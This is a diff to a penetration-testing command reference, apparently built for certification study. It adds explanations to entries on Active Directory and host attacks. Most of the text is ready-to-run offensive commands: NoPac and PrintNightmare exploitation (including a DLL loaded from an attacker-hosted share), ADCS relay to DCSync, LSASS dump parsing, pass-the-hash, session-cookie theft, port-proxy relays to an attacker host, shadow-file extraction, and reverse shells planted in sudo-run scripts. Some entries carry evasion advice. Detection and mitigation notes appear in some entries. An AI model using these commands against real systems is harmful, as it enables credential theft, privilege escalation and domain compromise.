         "secure_config": "# GPO: restrict workstation-to-workstation traffic:\nNew-NetFirewallRule -DisplayName 'Block W2W RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -RemoteAddress 10.0.0.0/8 -Action Block\nNew-NetFirewallRule -DisplayName 'Block W2W SMB' -Direction Inbound -Protocol TCP -LocalPort 445 -RemoteAddress 10.0.0.0/8 -Action Block\nNew-NetFirewallRule -DisplayName 'Block W2W WinRM' -Direction Inbound -Protocol TCP -LocalPort 5985,5986 -RemoteAddress 10.0.0.0/8 -Action Block\n\n# Network segmentation:\n# Workstation VLAN → default-deny to Server VLAN except explicitly allowed services"
-      }
+      },
+      "explain": "Fingerprints a Domain Controller by scanning the ports AD services live on:\n  nmap -sV                 version-detect each open service\n  -sC                      run default NSE scripts\n  -p 53,88,135,139,389,445,464,636,3268,3269   DNS, Kerberos, RPC, SMB, LDAP, kpasswd, LDAPS, and Global Catalog\n  <dc_ip>                  the suspected DC\nOpen 88 (Kerberos) + 389/636 (LDAP) + 3268 (GC) confirms it is a DC and tells you which AD services to attack next."
     },
     {
       "type": "command",
@@ -55004,7 +55197,8 @@ const COMMAND_DATA = {
           "label": "Exploit to impersonate DA",
           "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_name> --impersonate administrator -shell"
         }
-      ]
+      ],
+      "explain": "Exploits the NoPac chain (CVE-2021-42278 + CVE-2021-42287) to impersonate Administrator on the DC:\n  noPac.py                 create a machine account and abuse the sAMAccountName/PAC name-lookup flaw\n  <domain>/<user>:<password>   any valid domain credentials\n  -dc-ip <dc_ip> -dc-host <dc_hostname>   the DC's IP and hostname\n  -shell                   drop a SYSTEM shell on the DC\n  --impersonate administrator   request a DA-level service ticket\n  -use-ldap                talk to the DC over LDAP\nRun scanner.py first to confirm the DC is vulnerable; -dump replaces the shell with a hash dump."
     },
     {
       "id": "ad-nopac-scan",
@@ -55308,7 +55502,8 @@ const COMMAND_DATA = {
           "label": "Monitor Event 4724 - password reset attempt",
           "command": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4724} | Select -First 10 | Format-List"
         }
-      ]
+      ],
+      "explain": "Collects AD ACL data with SharpHound so BloodHound can find abusable object rights:\n  SharpHound.exe            the collector\n  -c All                   collect all methods (ACLs, sessions, group membership, etc.)\n  --zipfilename bh_output   name the output zip\nImport into BloodHound to spot GenericAll/GenericWrite/WriteDACL/WriteOwner over privileged objects; each maps to an abuse (reset password, add to group, grant DCSync). Detect the abuse via Events 4738/4724."
     },
     {
       "id": "office-macro-payload",
@@ -55532,7 +55727,8 @@ const COMMAND_DATA = {
           "CRTP",
           "MITRE T1003.001"
         ]
-      }
+      },
+      "explain": "Dumps LSASS on the target and parses it offline, so Mimikatz never runs on the victim (evades on-host EDR):\n  mimikatz.exe              runs on YOUR box, not the target\n  \"sekurlsa::minidump <dump_file>\"   load the exfiltrated LSASS dump instead of live memory\n  \"sekurlsa::ekeys\"         extract Kerberos AES/RC4 keys from it\n  \"exit\"                    quit\nCreate the dump on the target with a managed minidump tool, exfil it (repair with Reverse.exe if byte-reversed), then parse locally."
     },
     {
       "type": "command",
@@ -55733,7 +55929,8 @@ const COMMAND_DATA = {
         "sentinel_kql": "DeviceProcessEvents\n| where FileName startswith \"openssl\" or ProcessCommandLine has \"openssl\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc\n// brute-forcing an encrypted archive password locally; no target-side telemetry",
         "sigma_rules": "no target-side telemetry (openssl runs on the attacker host)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Brute-forces an OpenSSL-encrypted gzip archive against a wordlist:\n  for i in $(cat rockyou.txt)   try each word as the passphrase\n  openssl enc -aes-256-cbc -d -in <file> -k $i   attempt to decrypt with that key\n  2>/dev/null | tar xz     pipe the output to tar; only the correct key yields valid tar data to extract\nWhen the extraction succeeds you have both the passphrase and the files."
     },
     {
       "type": "command",
@@ -56731,7 +56928,8 @@ const COMMAND_DATA = {
           "CRTP",
           "MITRE T1615"
         ]
-      }
+      },
+      "explain": "Maps GPOs so you can spot policy you can abuse for code execution or local admin:\n  Get-DomainGPO            list every Group Policy Object\n  | select displayname,gpcfilesyspath   the friendly name and its SYSVOL path\nFollow up by resolving OU gplinks to GPOs (which computers a policy hits), Get-DomainGPOLocalGroup (GPO-granted local admin), and checking GPO ACLs for WriteProperty/WriteDacl - a writable GPO is a foothold on every computer in its OU."
     },
     {
       "id": "crtp-overpass-hash",
@@ -56849,7 +57047,8 @@ const COMMAND_DATA = {
           "label": "runas /netonly (inject creds into a new logon session)",
           "command": "runas /user:<domain>\\<user> /netonly cmd"
         }
-      ]
+      ],
+      "explain": "Turns an NTLM hash into a real Kerberos TGT (overpass-the-hash) for Kerberos lateral movement:\n  asktgt                    request a TGT from the KDC\n  /user:<user>             the account to authenticate as\n  /rc4:<nt_hash>           its NTLM hash used as the Kerberos key (use /aes256 for opsec)\n  /domain:<domain>         the domain\n  /ptt                      inject the ticket into the current session\n  /opsec                    mimic a genuine client's request flags\nWith the TGT injected you access services (dir \\\\<dc>\\C$) as that user without ever knowing the plaintext."
     },
     {
       "id": "api-security-top10-ref",
@@ -57038,7 +57237,8 @@ const COMMAND_DATA = {
         "ntlm",
         "lateral",
         "pth"
-      ]
+      ],
+      "explain": "Pass-the-hash to an SMB share with smbclient - no cracking needed:\n  smbclient \\\\\\\\<target>\\\\<share>   connect to the share\n  -U <domain>/<user>       the account\n  --pw-nt-hash <nt_hash>   treat the supplied string as an NT hash, not a plaintext password\nAdd -c 'ls'/'get'/'put' to list or transfer files non-interactively; impacket-psexec/wmiexec and crackmapexec accept the same hash for execution and share enumeration."
     },
     {
       "type": "command",
@@ -57142,7 +57342,8 @@ const COMMAND_DATA = {
           "MITRE T1574.007",
           "MITRE T1548"
         ]
-      }
+      },
+      "explain": "Hijacks a command a privileged script calls by relative name:\n  PATH=.:${PATH}           prepend the current (writable) directory to PATH so it is searched first\nThen drop a malicious executable named exactly like the command the script invokes (e.g. touch ls; make it executable). When the privileged script runs, your binary executes instead of the real one."
     },
     {
       "id": "pcredz-pcap",
@@ -57232,7 +57433,8 @@ const COMMAND_DATA = {
           "label": "Live capture from an interface",
           "command": "sudo ./Pcredz -i <interface> -v"
         }
-      ]
+      ],
+      "explain": "Extracts credentials from a packet capture:\n  ./Pcredz                 the parser\n  -f <pcap_file>           read this capture file (use -i <interface> for live capture)\n  -t                       parse credentials from the file\n  -v                       verbose output\nPulls HTTP basic/NTLM, FTP, SMTP/POP/IMAP logins, SNMP strings, and NTLMv1/v2 and Kerberos hashes - hunt cleartext protocols first, and crack any captured NetNTLM offline."
     },
     {
       "id": "pentest-lifecycle",
@@ -57397,7 +57599,8 @@ const COMMAND_DATA = {
           "label": "Use the captured DC cert for a TGT (PKINIT)",
           "command": "python3 gettgtpkinit.py -pfx-base64 <b64> <domain>/<dc_name>\\$ dc.ccache"
         }
-      ]
+      ],
+      "explain": "Relays a coerced DC authentication to ADCS web enrollment to obtain a DC certificate (PetitPotam + ESC8):\n  ntlmrelayx.py            relay captured NTLM auth\n  -smb2support             accept SMB2\n  --target http://<ca_host>/certsrv/certfnsh.asp   the HTTP enrollment endpoint (no HTTPS = relayable)\n  --adcs                   request a certificate on relay\n  --template DomainController   the template to request as the DC\n  -debug                   verbose output\nTrigger PetitPotam.py to coerce the DC's machine account in; the issued cert then feeds gettgtpkinit for a DC TGT and DCSync."
     },
     {
       "type": "command",
@@ -57613,7 +57816,8 @@ const COMMAND_DATA = {
           "MITRE T1555"
         ],
         "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
-      }
+      },
+      "explain": "Decrypts passwords stored by mRemoteNG:\n  python3 mremoteng_decrypt.py   the decryptor\n  -s \"<encrypted_string>\"   the encrypted password from confCons.xml\nmRemoteNG encrypts connection passwords with a hardcoded default key (mR3m), so they decrypt directly; add a wordlist option to brute-force a custom master password."
     },
     {
       "type": "command",
@@ -57722,7 +57926,8 @@ const COMMAND_DATA = {
           "MITRE T1552.001"
         ],
         "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
-      }
+      },
+      "explain": "Recovers registry hives from a found restic backup repo to extract hashes:\n  restic.exe -r <repo>     open the repository (needs its password)\n  restore <snapshot_id>    restore this snapshot\n  --target C:\\Restore      where to write the restored files\nRestore a snapshot containing C:\\Windows\\System32\\config to get SAM/SYSTEM/SECURITY, then secretsdump them offline for the Administrator hash (pass-the-hash)."
     },
     {
       "type": "command",
@@ -57817,7 +58022,8 @@ const COMMAND_DATA = {
           "MITRE T1048"
         ],
         "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
-      }
+      },
+      "explain": "Backs up locked registry hives using restic's VSS support, then dumps them offline:\n  restic.exe -r <repo> backup   create a backup into the repo\n  C:\\Windows\\System32\\config   the live SAM/SYSTEM/SECURITY hives (normally locked)\n  --use-fs-snapshot        use a Volume Shadow Copy so the locked files can be read\nRestore the snapshot elsewhere and run secretsdump for the local hashes."
     },
     {
       "type": "command",
@@ -57917,7 +58123,8 @@ const COMMAND_DATA = {
           "MITRE T1552"
         ],
         "evasion": "Collect only the files you need and pull them over an existing channel; avoid staging large toolsets on the host; delete anything you drop."
-      }
+      },
+      "explain": "Steals browser session cookies to hijack authenticated web sessions:\n  Invoke-SharpChromium     SharpChromium loader\n  -Command \"cookies slack.com\"   extract Chrome cookies for this domain (e.g. a Slack session)\nImport the stolen cookie into your own browser to ride the session without a password. For Firefox, copy cookies.sqlite and use cookieextractor.py."
     },
     {
       "id": "ad-pingcastle",
@@ -58261,7 +58468,8 @@ const COMMAND_DATA = {
           "MITRE T1090.001",
           "MITRE T1021.006"
         ]
-      }
+      },
+      "explain": "Turns a compromised jump host into a relay so deep hosts that cannot reach your box can fetch payloads:\n  netsh interface portproxy add v4tov4   add an IPv4->IPv4 forward on the jump host\n  listenport=<listen_port> listenaddress=0.0.0.0   accept connections on this port, all interfaces\n  connectport=<dst_port> connectaddress=<attacker_ip>   forward them to your web server\nThen tools on the deep host (Loader.exe -path http://127.0.0.1:<listen_port>/...) reach you through the jump host, fileless."
     },
     {
       "id": "cdsa-m06-pki-esc1",
@@ -58383,7 +58591,8 @@ const COMMAND_DATA = {
           "label": "List issued certificates via certutil",
           "command": "certutil -view -restrict \"DispositionMessage=Issued\" -out RequesterName,CommonName,UPN,CertificateTemplate"
         }
-      ]
+      ],
+      "explain": "Certify hunts for ESC1-vulnerable certificate templates (requester supplies the SAN):\n  Certify.exe find          enumerate CA templates\n  /vulnerable              show only templates with exploitable misconfigurations\nOn an ESC1 hit, request a cert with /altname:Administrator, convert PEM to PFX, and PKINIT with Rubeus asktgt to become that user. Detect via CA Event 4887 (cert issued) and certutil -view of issued certs with mismatched UPN/CommonName."
     },
     {
       "id": "cdsa-m06-pki-esc8",
@@ -58504,7 +58713,8 @@ const COMMAND_DATA = {
           "label": "Disable ADCS web enrollment HTTP on IIS",
           "command": "Import-Module WebAdministration; Set-WebBinding -Name 'Default Web Site' -Protocol 'http' -Action 'Delete'"
         }
-      ]
+      ],
+      "explain": "Relays a coerced DC's NTLM auth to the ADCS web enrollment endpoint (ESC8) to mint a DC certificate:\n  impacket-ntlmrelayx       relay captured NTLM authentication\n  -t http://<pki_ip>/certsrv/default.asp   the HTTP web-enrollment target (no HTTPS = relayable)\n  --template DomainController   request a cert using the DC certificate template\n  -smb2support --adcs      support SMB2 and enable the AD CS attack mode\nCoerce the DC (PrinterBug) so its auth arrives; the relayed cert lets Rubeus PKINIT as DC$ and then DCSync. Fix by disabling HTTP web enrollment on IIS."
     },
     {
       "id": "ptc-gettgt",
@@ -58618,7 +58828,8 @@ const COMMAND_DATA = {
           "label": "Use it",
           "command": "export KRB5CCNAME=tgt.ccache; secretsdump.py -k -no-pass <domain>/<user>@<dc_fqdn>"
         }
-      ]
+      ],
+      "explain": "Requests a Kerberos TGT via PKINIT using a certificate (pass-the-certificate):\n  gettgtpkinit.py          PKINITtools TGT requester\n  -cert-pfx <pfx_file>     the certificate (from ADCS relay or shadow credentials)\n  -pfx-pass '<pfx_pass>'   the PFX password\n  -dc-ip <dc_ip>           the DC to authenticate to\n  <domain>/<user>          the principal the cert authenticates as\n  <ccache>                 output ccache file\nExport KRB5CCNAME to that ccache, then run secretsdump/services as the cert's owner."
     },
     {
       "id": "plink-dynamic",
@@ -58824,7 +59035,8 @@ const COMMAND_DATA = {
           "MITRE T1068",
           "OWASP A06:2021"
         ]
-      }
+      },
+      "explain": "Runs the PwnKit exploit (CVE-2021-4034) against pkexec for instant local root:\n  ./poc                    trigger the pkexec memory-corruption bug to spawn a root shell\nPwnKit is a 12-year-old flaw in polkit's SUID-root pkexec affecting default installs. Confirm pkexec exists, clone and gcc the tiny PoC, then run it and check id."
     },
     {
       "id": "post-engagement-cleanup",
@@ -59021,7 +59233,8 @@ const COMMAND_DATA = {
           "label": "Scan a specific host list",
           "command": "Invoke-HuntSMBShares -Threads 100 -HostList C:\\hosts.txt -OutputDirectory C:\\Users\\Public"
         }
-      ]
+      ],
+      "explain": "Inventories domain SMB shares and flags dangerous access, from a domain-joined host:\n  Invoke-HuntSMBShares     discover shares and score their permissions\n  -Threads 100             parallelism for speed\n  -OutputDirectory C:\\Users\\Public   where to write the HTML/CSV report\nHighlights shares readable/writable by low-priv users - where sensitive files and credentials leak; -HostList scopes it to specific hosts."
     },
     {
       "id": "ad-acl-pscredential",
@@ -59105,7 +59318,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "powershell"
-      ]
+      ],
+      "explain": "Builds a PSCredential object so PowerView ACL-abuse cmdlets run as a controlled account, not your logon:\n  ConvertTo-SecureString '<password>' -AsPlainText -Force   wrap the known password as a SecureString\n  New-Object ...PSCredential('<domain>\\<user>', $SecPassword)   pair it with the username\nPass the resulting $Cred to -Credential on Add-DomainGroupMember/Set-DomainObject so you exercise that account's AD rights without changing your session."
     },
     {
       "id": "ps-port-scan-loop",
@@ -59537,7 +59751,8 @@ const COMMAND_DATA = {
           "label": "Service abuse (writable service)",
           "command": "Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>' -Verbose"
         }
-      ]
+      ],
+      "explain": "Runs every PowerUp check to find Windows local privilege-escalation vectors:\n  Invoke-AllChecks          scan for unquoted service paths, weak service/file permissions, AlwaysInstallElevated, autologon creds, DLL hijacks, etc.\nDot-source PowerUp.ps1 first. Each finding maps to an abuse function - e.g. Invoke-ServiceAbuse -Name <service> -UserName <domain>\\<user> hijacks a writable service to add you to a group."
     },
     {
       "id": "ad-powerupsql",
@@ -59759,7 +59974,8 @@ const COMMAND_DATA = {
           "label": "Reset the target's password",
           "command": "Set-DomainUserPassword -Identity <target_user> -AccountPassword $newpw -Credential $Cred"
         }
-      ]
+      ],
+      "explain": "Resets a user's password without knowing the old one, via the ForceChangePassword right:\n  Set-DomainUserPassword   PowerView password reset\n  -Identity <target_user>  the account whose password you reset\n  -AccountPassword $newpw  a SecureString holding the new password\n  -Credential $Cred        run as the account that holds ForceChangePassword/GenericAll\n  -Verbose                  show the result\nYou now control the target account. net rpc password does the same from Linux."
     },
     {
       "id": "ad-acl-addgroupmember",
@@ -59883,7 +60099,8 @@ const COMMAND_DATA = {
           "label": "Verify membership",
           "command": "Get-DomainGroupMember -Identity '<group>' | select MemberName"
         }
-      ]
+      ],
+      "explain": "Adds a member to a group you have GenericWrite/AddMember over, inheriting the group's rights:\n  Add-DomainGroupMember   PowerView group modification\n  -Identity '<group>'      the group you can write to\n  -Members '<user>'        the principal to add (yourself)\n  -Credential $Cred        run as the account that holds the write right (not your logon)\n  -Verbose                  show the result\nRe-authenticate afterward so the new membership lands in your Kerberos ticket."
     },
     {
       "id": "ad-domainobjectacl",
@@ -60002,7 +60219,8 @@ const COMMAND_DATA = {
           "label": "Find what that SID can modify",
           "command": "Get-DomainObjectAcl -ResolveGUIDs -Identity <object> | ?{$_.SecurityIdentifier -eq $sid}"
         }
-      ]
+      ],
+      "explain": "Enumerates which objects a principal you control can modify (step before an ACL escalation):\n  $sid = Convert-NameToSid <user>   resolve your controlled account to its SID\n  Get-DomainObjectACL -ResolveGUIDs -Identity *   read ACEs across objects with readable right names\n  ? {$_.SecurityIdentifier -eq $sid}   keep only ACEs granted to that SID\nFilter the results for GenericAll/WriteDacl/WriteOwner/GenericWrite; WriteDACL over the domain lets you then Add-DomainObjectACL your own DCSync rights."
     },
     {
       "id": "ad-gpo-enum",
@@ -60759,7 +60977,8 @@ const COMMAND_DATA = {
           "label": "Crack offline",
           "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
         }
-      ]
+      ],
+      "explain": "Roasts SPN accounts directly with PowerView, output in hashcat format:\n  Get-DomainUser -Identity <user>   pick the SPN account (or use -SPN for all)\n  | Get-DomainSPNTicket   request its TGS ticket\n  -Format Hashcat          emit it in hashcat-crackable format\nPipe all -SPN users through it to roast the whole domain to a CSV; crack the hashes with hashcat -m 13100."
     },
     {
       "id": "ad-powerview-groupmember",
@@ -61370,7 +61589,8 @@ const COMMAND_DATA = {
           "label": "Crack + then remove the SPN",
           "command": "hashcat -m 13100 hash.txt rockyou.txt ; Set-DomainObject -Identity <target> -Clear serviceprincipalname"
         }
-      ]
+      ],
+      "explain": "Turns GenericWrite over a user into that user's password by planting a temporary SPN:\n  Set-DomainObject         PowerView attribute writer\n  -Credential $Cred        act as the account holding the write right\n  -Identity <target>       the SPN-less victim user\n  -SET @{serviceprincipalname='nonexistent/BLAH'}   add a fake SPN so the account becomes Kerberoastable\n  -Verbose                  show the result\nRoast it (Rubeus kerberoast /user:<target>), crack the hash (hashcat -m 13100), then -Clear serviceprincipalname to clean up."
     },
     {
       "id": "ad-powerview-test-adminaccess",
@@ -61593,7 +61813,8 @@ const COMMAND_DATA = {
           "label": "Convert-SidToName (SID to readable name)",
           "command": "Convert-SidToName <sid>"
         }
-      ]
+      ],
+      "explain": "Hunts for dangerous, non-default ACLs across the domain with PowerView:\n  Find-InterestingDomainAcl   enumerate ACEs that are not built-in defaults\n  -ResolveGUIDs            translate schema/extended-right GUIDs to readable rights\n  | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights   who has what right over which object\nLook for WriteDACL/GenericAll/GenericWrite/AllExtendedRights held by non-privileged users - each is an ACL abuse path (Shadow Creds, targeted Kerberoast, DCSync grant)."
     },
     {
       "id": "crtp-powerview-domain",
@@ -61725,7 +61946,8 @@ const COMMAND_DATA = {
           "label": "Deprecated PowerView alias (OSCP PEN-200 Ch21)",
           "command": "Get-NetDomain   # older PowerView name for Get-Domain - identical output"
         }
-      ]
+      ],
+      "explain": "Enumerates the domain, forest, and DCs from an authenticated Windows session with PowerView:\n  Get-Domain               core domain object (add -Domain <domain> to target a trusted domain)\nFollow-ons: Get-DomainController for DCs, Get-Forest for the forest, Get-DomainSID for the SID you need to forge tickets. (Get-NetDomain is the deprecated alias.)"
     },
     {
       "id": "crtp-powerview-file-hunting",
@@ -61857,7 +62079,8 @@ const COMMAND_DATA = {
           "https://attack.mitre.org/techniques/T1552/001/",
           "CRTP Domain Enumeration"
         ]
-      }
+      },
+      "explain": "The PowerView-native equivalent of Snaffler - finds secrets sitting on domain shares:\n  Find-InterestingDomainShareFile   walk readable shares for files matching name patterns\n  -Include *pass*,*.config,*.xml,*.vbs,*.ps1   the sensitive filename patterns to flag\nRun Find-DomainShare -CheckShareAccess first to know which shares you can read, then inspect promising hits with Get-PathAcl. Often surfaces cleartext creds in scripts/configs."
     },
     {
       "id": "crtp-powerview-sites-subnets",
@@ -61994,7 +62217,8 @@ const COMMAND_DATA = {
           "https://attack.mitre.org/techniques/T1018/",
           "CRTP Domain Enumeration"
         ]
-      }
+      },
+      "explain": "Maps the physical/logical topology of the forest with PowerView:\n  Get-DomainSite           enumerate AD Sites\n  | select name,siteobjectbl   the site name and its linked subnet backlinks\nPair with Get-DomainSubnet (subnet->site), Get-ForestGlobalCatalog, and Get-NetComputerSiteName to learn network segmentation and where DCs/GCs/file servers physically sit - useful for planning pivots."
     },
     {
       "id": "crtp-powerview-trusts",
@@ -62110,7 +62334,8 @@ const COMMAND_DATA = {
           "label": "Get-DomainTrustMapping (recursive full trust map)",
           "command": "Get-DomainTrustMapping"
         }
-      ]
+      ],
+      "explain": "Enumerates trust relationships to find lateral paths across domain/forest boundaries:\n  Get-DomainTrust          list this domain's trusts\n  | select SourceName,TargetName,TrustDirection,TrustType   the endpoints, direction, and kind of each trust\nAdd Get-ForestTrust for forest trusts and Get-DomainTrustMapping to recursively map the whole trust graph - the direction and type tell you which trusts can be abused (e.g. SID History via a parent-child trust)."
     },
     {
       "id": "crtp-powerview-userhunting",
@@ -62252,7 +62477,8 @@ const COMMAND_DATA = {
           "label": "Get-NetLocalGroup (local groups on a machine)",
           "command": "Get-NetLocalGroup -ComputerName <host>"
         }
-      ]
+      ],
+      "explain": "Locates where privileged users are currently logged on, to plan a lateral hop that steals their session:\n  Find-DomainUserLocation   query hosts for sessions of high-value users\n  -CheckAccess             also test whether YOU are local admin on each host found\nWhere a DA is logged in AND you have admin, that box is a credential-theft target. Backing cmdlets (Get-NetSession, Get-NetLoggedon, Find-LocalAdminAccess) enumerate sessions and admin access per host."
     },
     {
       "id": "crtp-powerview-users-groups",
@@ -62446,7 +62672,8 @@ const COMMAND_DATA = {
           "label": "Export-PowerViewCSV (thread-safe CSV output)",
           "command": "Get-DomainUser | Export-PowerViewCSV -CSV <outfile>.csv"
         }
-      ]
+      ],
+      "explain": "Enumerates users, groups, and the accounts worth attacking with PowerView:\n  Get-DomainUser -Properties samaccountname,description,memberof,admincount   pull key attributes\n  | select samaccountname,description,admincount   admincount=1 marks protected (privileged) accounts; descriptions often leak passwords\nSwap flags to hunt targets: -SPN (Kerberoastable), -PreauthNotRequired (AS-REP roastable), Get-DomainGroupMember 'Domain Admins' -Recurse."
     },
     {
       "id": "pre-engagement-docs",
@@ -62698,7 +62925,8 @@ const COMMAND_DATA = {
           "MITRE T1068"
         ],
         "evasion": "Load the driver for execution then remove it; SeLoadDriver abuse is a single event - do it once."
-      }
+      },
+      "explain": "Abuses Print Operators' SeLoadDriverPrivilege to load a vulnerable driver and get SYSTEM:\n  EoPLoadDriver.exe        register the driver under HKCU and load it via NtLoadDriver\n  System\\CurrentControlSet\\Capcom   the registry path it creates for the service\n  c:\\Tools\\Capcom.sys      the vulnerable Capcom driver to load\nWith the driver loaded, ExploitCapcom runs a shell as SYSTEM by abusing its kernel primitive."
     },
     {
       "id": "cdsa-m06-print-spooler-ntlm-relay",
@@ -62806,7 +63034,8 @@ const COMMAND_DATA = {
           "label": "Disable Print Spooler service",
           "command": "Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled"
         }
-      ]
+      ],
+      "explain": "Relays a coerced DC's NTLM authentication straight into a DCSync against a second DC:\n  impacket-ntlmrelayx       relay captured NTLM auth\n  -t dcsync://<dc2_ip>     target another DC and, on a successful relay, perform DCSync over it\n  -smb2support             accept SMB2 connections\nTrigger the PrinterBug (dementor.py) so DC1 authenticates to you; relaying that machine account to DC2 dumps hashes without generating 4662 on DC1. Mitigate by disabling the Print Spooler / its remote RPC endpoint."
     },
     {
       "type": "command",
@@ -62924,7 +63153,8 @@ const COMMAND_DATA = {
           "label": "Exploit to run SYSTEM code",
           "command": "Invoke-Nightmare -NewUser \"hacker\" -NewPassword \"P@ssw0rd!\""
         }
-      ]
+      ],
+      "explain": "Runs code as SYSTEM via the Print Spooler driver-install path (PrintNightmare):\n  Invoke-Nightmare         the PowerShell PoC\n  -NewUser \"<user>\" -NewPassword \"<password>\"   the local admin it creates\n  -DriverName \"PrintIt\"    the fake print driver name it installs\nConfirm the Spooler is running first. Remote (CVE-2021-1675.py) and Mimikatz misc::printnightmare variants drop a DLL from a share instead."
     },
     {
       "id": "ad-printnightmare",
@@ -63017,7 +63247,8 @@ const COMMAND_DATA = {
           "label": "Local (add admin)",
           "command": "Invoke-Nightmare -NewUser <user> -NewPassword <password>"
         }
-      ]
+      ],
+      "explain": "Loads an attacker DLL as SYSTEM via the Print Spooler bug (CVE-2021-1675), remotely:\n  CVE-2021-1675.py         the impacket-based exploit\n  <domain>/<user>:<password>@<dc_ip>   authenticated domain creds and the target\n  '\\\\<attacker_ip>\\smb\\shell.dll'   UNC path to your malicious driver DLL on an SMB share\nThe spooler installs the driver and executes your DLL as SYSTEM. Invoke-Nightmare is the local PowerShell variant that just adds an admin."
     },
     {
       "type": "command",
@@ -63113,7 +63344,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Runs the go-to Linux enumeration script right after a foothold:\n  ./linpeas.sh             sweep the host for privesc vectors (SUID/SGID, sudo rights, cron, writable files, creds in configs, kernel version) and colour-highlight the wins\nStart here, then chase the obvious findings - installed packages, sudo rights, and readable configs with credentials."
     },
     {
       "type": "command",
@@ -63202,7 +63434,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Logs in as a user with a recovered SSH private key:\n  ssh <user>@<ip>          connect as that user\n  -i id_rsa                authenticate with this private key file (chmod 600 it first)\nA found private key gives instant access as its owner. If instead you can write a user's ~/.ssh/authorized_keys, append your own public key for a guaranteed login."
     },
     {
       "type": "command",
@@ -63287,7 +63520,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Escalates directly when you already have sudo rights or a password:\n  sudo -l                  list what commands you may run as root\nIf it shows broad rights (or you know the password), sudo su - or su - drops you into a root shell immediately."
     },
     {
       "id": "gs-sudo-script-abuse",
@@ -63400,7 +63634,8 @@ const COMMAND_DATA = {
       ],
       "primary_cert": "CPTS",
       "source": "CPTS Module 02: Getting Started",
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Escalates when sudoers lets you run a script you can also write:\n  sudo -l                  list your sudo rights - look for (root) NOPASSWD: /path/to/script.sh\nIf that script is owned or writable by you, append a reverse-shell line to it and re-run it with sudo - your payload executes as root. The sudoers path and write access to the file are both required."
     },
     {
       "type": "command",
@@ -63503,7 +63738,8 @@ const COMMAND_DATA = {
           "label": "Extract /etc/shadow and crack",
           "command": "debugfs -R 'cat /etc/shadow' /dev/sda1 | tee shadow"
         }
-      ]
+      ],
